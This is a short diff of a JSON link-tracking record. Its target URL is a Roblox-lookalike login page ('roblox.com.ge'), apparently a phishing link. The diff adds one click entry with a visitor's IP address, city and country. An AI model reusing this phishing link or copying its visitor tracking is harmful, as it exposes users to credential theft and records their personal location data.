@@ -118,7 +118,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1068,
+    "useCount": 1069,
     "createdBy": "admin",
     "clicks": [
       {
@@ -8659,6 +8659,14 @@
       },
       {
         "timestamp": 1777246251532,
+        "ip": "68.2.188.113",
+        "country": "United States",
+        "city": "Scottsdale",
+        "flag": "🇺🇸",
+        "countryCode": "US"
+      },
+      {
+        "timestamp": 1777246270202,
         "ip": "68.2.188.113",
         "country": "United States",
         "city": "Scottsdale",
